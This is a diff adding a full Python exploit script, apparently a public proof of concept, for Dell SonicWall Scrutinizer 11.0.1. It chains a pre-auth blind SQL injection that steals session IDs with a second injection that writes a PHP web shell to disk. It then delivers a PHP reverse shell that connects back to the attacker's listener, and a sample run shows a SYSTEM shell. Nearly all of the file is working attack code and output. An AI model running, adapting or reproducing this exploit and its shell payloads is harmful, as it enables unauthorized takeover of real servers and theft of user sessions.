@@ -1,0 +1,280 @@
+#!/usr/local/bin/python
+"""
+Dell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQL Injection Remote Code Execution
+sonic.py by mr_me@offensive-security.com
+greets to @brandonprry ;->
+
+Summary:
+========
+
+This exploits an pre-auth SQL Injection in the login.php script within an update statement to steal session data. You could also steal login creds 
+which require absolutely no hash cracking since the target uses symmetric encryption. It then exploits a second post-auth SQL Injection vulnerability 
+that writes a shell to the target using a relative path and gets SYSTEM.
+
+Vulnerability:
+==============
+
+In html/d4d/login.php on lines 27-34:
+
+    }else if ($_REQUEST['setSkin']){
+        echo setUserSkin(
+          array(
+            'db' => $db,
+            'user_id' => $_REQUEST['user_id'],
+            'skin' => $_REQUEST['setSkin']
+          )
+        );
+
+ Then, on lines 46-62:
+
+ function setUserSkin($args){
+    $db = $args['db'];
+    
+    $result = $db->query("
+UPDATE plixer.userpreferences
+SET setting = '$args[skin]'
+WHERE prefCode = 'skin'
+AND users_id = $args[user_id]");
+    
+    if ($args['user_id'] == 1){
+        $result2 = $db->query("
+UPDATE plixer.serverprefs
+SET currentVal = '$args[skin]'
+WHERE langKey = 'skin'");
+    }
+    
+}
+
+For the post-auth bug, see https://gist.github.com/brandonprry/76741d9a0d4f518fe297
+
+Example:
+========
+
+saturn:module-03 mr_me$ ./sonic.py
+
+	Dell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQLi Explo!t
+	mr_me@offensive-security.com
+
+(!) usage: ./poc.py <target> <connectback:port>
+saturn:module-03 mr_me$ ./poc.py 172.16.175.147 172.16.175.1:1111
+
+	Dell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQLi Explo!t
+	mr_me@offensive-security.com
+
+(+) target is vuln, proceeding
+(+) waiting for session data... starting at: 2016-05-06 16:31:37.022818
+(+) awesome, appears like someone has logged in... 
+(+) it took 0:00:05.020670 to detect valid session data
+(+) extracting session data... 1:NfS5yetP49TXCqP5
+(+) backdooring target...
+(+) starting handler on port 1111
+(+) connection from 172.16.175.147
+(+) pop thy shell!
+whoami
+nt authority\system
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : localdomain
+   IP Address. . . . . . . . . . . . : 172.16.175.147
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.175.2
+*** Connection closed by remote host ***
+"""
+import re
+import sys
+import requests
+import datetime
+import socket
+import telnetlib
+import email.utils as eut
+from threading import Thread
+from base64 import b64encode as b64e
+
+lower_value = 0
+upper_value = 126
+
+def banner():
+	return """\n\tDell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQLi Explo!t\n\tmr_me@offensive-security.com\n"""
+
+def ct():
+	return datetime.datetime.now()
+
+def parsedate(text):
+    return datetime.datetime(*eut.parsedate(text)[:6])
+
+def check_args():
+    global target, lserver, lport
+    if len(sys.argv) < 3:
+        return False
+    cb = sys.argv[2]
+    target = "http://%s" % sys.argv[1]
+    if not ":" in cb:
+    	return False
+    if not cb.split(":")[1].isdigit():
+    	return False
+    lserver = cb.split(":")[0]
+    lport   = int(cb.split(":")[1])
+    return True
+
+def validate():
+    r = requests.get("%s/index.html" % target)
+    if re.search('Scrutinizer 11.0.1', r.text):
+        return True
+    return False
+
+def have_sessions(time):
+    """
+    check if we have sessions
+    """   	
+    sqli = "if(ascii(substring((select count(session_id) from sessions),1,1))!=48,sleep(%s),null)" % (time)
+    url = "d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s" % sqli
+    st = ct()
+    r = requests.get("%s/%s" % (target, url))
+    delta = ct()-st
+    if int(delta.seconds) < time:
+        return False
+    return True
+
+def do_time_based_blind(sql, time):
+    lower = lower_value
+    upper = upper_value
+    while lower < upper:
+        try:
+            mid = (lower + upper) / 2
+            url = "%s/%s" % (target, ("%s>%s,sleep(%s),null)" % (sql, str(mid), time)))
+            st = ct()
+            r = requests.get(url)
+            delta = ct()-st
+            if int(delta.seconds) >= time:
+                lower = mid + 1
+            else:
+                upper = mid
+        except (KeyboardInterrupt, SystemExit):
+            raise
+        except:
+            pass
+ 
+    if lower > lower_value and lower < upper_value:
+        value = lower
+    else:
+        url = "%s/%s" % (target, ("%s=%s,sleep(%s),null)" % (sql, str(lower), time)))
+        st = ct()
+        r = requests.get(url)
+        delta = ct()-st
+        if int(delta.seconds) >= time:
+            value = lower
+    return value
+
+def steal_session_length():
+    xlen = ""
+    sqli    = "if(ascii(substring((select length(length(concat(user_id,0x3a,session_id))) from sessions limit 0,1),1,1))"
+    qry_str = "d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s" % sqli
+    zlen = int(chr(do_time_based_blind(qry_str, 5)))
+    for i in range(0, zlen):
+        sqli = "if(ascii(substring((select length(concat(user_id,0x3a,session_id)) from sessions limit 0,1),%d,1))" % (i+1)
+        qry_str = "d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s" % sqli
+        xlen += chr(do_time_based_blind(qry_str, 5))
+    return int(xlen)
+
+def steal_session(length, time):
+    session = ""
+    for i in range(0, length):
+        sqli    = "if(ascii(substring((select concat(user_id,0x3a,session_id) from sessions limit 0,1),%d,1))" % (i+1)
+        qry_str = "d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s" % sqli
+        char = chr(do_time_based_blind(qry_str, 5))
+    	session += char
+    	sys.stdout.write(char)
+    	sys.stdout.flush() 
+    return session
+
+# build the reverse php shell
+def build_php_code():
+    phpkode  = ("""
+    @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);""")
+    phpkode += ("""$dis=@ini_get('disable_functions');""")
+    phpkode += ("""if(!empty($dis)){$dis=preg_replace('/[, ]+/', ',', $dis);$dis=explode(',', $dis);""")
+    phpkode += ("""$dis=array_map('trim', $dis);}else{$dis=array();} """)
+    phpkode += ("""if(!function_exists('LcNIcoB')){function LcNIcoB($c){ """)
+    phpkode += ("""global $dis;if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {$c=$c." 2>&1\\n";} """)
+    phpkode += ("""$imARhD='is_callable';$kqqI='in_array';""")
+    phpkode += ("""if($imARhD('popen')and!$kqqI('popen',$dis)){$fp=popen($c,'r');""")
+    phpkode += ("""$o=NULL;if(is_resource($fp)){while(!feof($fp)){ """)
+    phpkode += ("""$o.=fread($fp,1024);}}@pclose($fp);}else""")
+    phpkode += ("""if($imARhD('proc_open')and!$kqqI('proc_open',$dis)){ """)
+    phpkode += ("""$handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes); """)
+    phpkode += ("""$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);} """)
+    phpkode += ("""@proc_close($handle);}else if($imARhD('system')and!$kqqI('system',$dis)){ """)
+    phpkode += ("""ob_start();system($c);$o=ob_get_contents();ob_end_clean(); """)
+    phpkode += ("""}else if($imARhD('passthru')and!$kqqI('passthru',$dis)){ob_start();passthru($c); """)
+    phpkode += ("""$o=ob_get_contents();ob_end_clean(); """)
+    phpkode += ("""}else if($imARhD('shell_exec')and!$kqqI('shell_exec',$dis)){ """)
+    phpkode += ("""$o=shell_exec($c);}else if($imARhD('exec')and!$kqqI('exec',$dis)){ """)
+    phpkode += ("""$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}else{$o=0;}return $o;}} """)
+    phpkode += ("""$nofuncs='no exec functions'; """)
+    phpkode += ("""if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){ """)
+    phpkode += ("""$s=@fsockopen('tcp://%s','%d');while($c=fread($s,2048)){$out = ''; """ % (lserver, lport))
+    phpkode += ("""if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
+    phpkode += ("""}elseif (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit'){break;}else{ """)
+    phpkode += ("""$out=LcNIcoB(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs); """)
+    phpkode += ("""break;}}fwrite($s,$out);}fclose($s);}else{ """)
+    phpkode += ("""$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,'%s','%d'); """ % (lserver, lport))
+    phpkode += ("""@socket_write($s,"socket_create");while($c=@socket_read($s,2048)){ """)
+    phpkode += ("""$out = '';if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
+    phpkode += ("""} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { """)
+    phpkode += ("""break;}else{$out=LcNIcoB(substr($c,0,-1));if($out===false){ """)
+    phpkode += ("""@socket_write($s,$nofuncs);break;}}@socket_write($s,$out,strlen($out)); """)
+    phpkode += ("""}@socket_close($s);} """)
+    return phpkode
+
+def kill_shot(stolen_data):
+    user_id    = stolen_data.split(":")[0]
+    sessionid = stolen_data.split(":")[1]
+    url = "d4d/dashboards.php?deleteTab=1 union select '<?php eval(base64_decode($_COOKIE[\\'awae\\'])); ?>' into outfile '../../html/d4d/offsec.php'"
+    requests.get("%s/%s" % (target, url), cookies={"userid": user_id, "sessionid": sessionid})
+
+def exec_code():
+    phpkodez = b64e(build_php_code())
+    handlerthr = Thread(target=handler, args=(lport,))
+    handlerthr.start()
+    requests.get("%s/d4d/offsec.php" % (target), cookies={"awae": phpkodez})
+
+def handler(lport):
+    print "(+) starting handler on port %d" % lport
+    t = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lport))
+    s.listen(1)
+    conn, addr = s.accept()
+    print "(+) connection from %s" % addr[0]
+    t.sock = conn
+    print "(+) pop thy shell!"
+    t.interact()
+
+def main():
+    if check_args():
+        if validate():
+            print "(+) target is vuln, proceeding"
+            st = ct()
+            print "(+) waiting for session data... starting at: %s" % ct()
+            # we dont use recursion since we could get stack exhaustion. 
+            while not have_sessions(5):
+            	pass
+            print "(+) awesome, appears like someone has logged in... "
+            print "(+) it took %s to detect valid session data" % (ct()-st)
+            sys.stdout.flush() 
+            sys.stdout.write("(+) extracting session data... ")
+            dataz = steal_session(steal_session_length(), 5)
+            print "\n(+) backdooring target..."
+            kill_shot(dataz)
+            exec_code()
+    else:
+    	print "(!) usage: %s <target> <connectback:port>" % sys.argv[0]
+
+if __name__ == "__main__":
+    print banner()
+    main()
